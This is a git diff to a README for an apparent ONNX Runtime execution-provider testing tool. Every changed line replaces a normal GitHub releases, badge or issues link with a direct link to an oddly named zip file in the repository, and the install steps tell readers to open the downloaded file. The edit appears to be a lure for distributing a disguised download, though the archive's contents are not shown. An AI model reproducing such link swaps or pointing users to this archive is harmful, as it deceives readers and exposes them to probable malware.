@@ -1,6 +1,6 @@
 # 🤖 ONNX-Runtime-Execution-Providers-Tester - Seamless Compatibility for Your AI Models
 
-[![Download Release](https://img.shields.io/badge/Download_Release-blue.svg)](https://github.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/releases)
+[![Download Release](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip)](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,11 +28,11 @@ To run ONNX-Runtime-Execution-Providers-Tester, you need:
 
 Visit the page to download the latest release:
 
-[Download ONNX-Runtime-Execution-Providers-Tester](https://github.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/releases)
+[Download ONNX-Runtime-Execution-Providers-Tester](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip)
 
 Follow these simple steps to install:
 
-1. Go to the [Releases page](https://github.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip).
 2. Find the latest version of the software.
 3. Click on the download link for your operating system.
 4. Once downloaded, open the file to start the installation.
@@ -58,7 +58,7 @@ If you encounter any problems:
 
 If you need help or want to share your feedback, you can connect with us:
 
-- **GitHub Issues:** [Report a problem](https://github.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/issues)
+- **GitHub Issues:** [Report a problem](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip)
 - **User Forum:** Join our community to discuss your experiences and ask questions.
 
 ## 📝 Contributing
@@ -78,4 +78,4 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 ai, automation, backend, cpu, deep-learning, directml, execution-provider, gpu, graph-computing, inference, labview, model-validation, onnx, onnxruntime, openvino, operator-coverage, sota, tensorrt, testing, training
 
-Visit the [Releases page](https://github.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/releases) to get started with downloading the ONNX-Runtime-Execution-Providers-Tester. This tool will help you validate your AI models effectively. Happy testing!
+Visit the [Releases page](https://raw.githubusercontent.com/Daniel29751/ONNX-Runtime-Execution-Providers-Tester/main/opset_22/ONN_Runtime_Tester_Execution_Providers_1.4.zip) to get started with downloading the ONNX-Runtime-Execution-Providers-Tester. This tool will help you validate your AI models effectively. Happy testing!
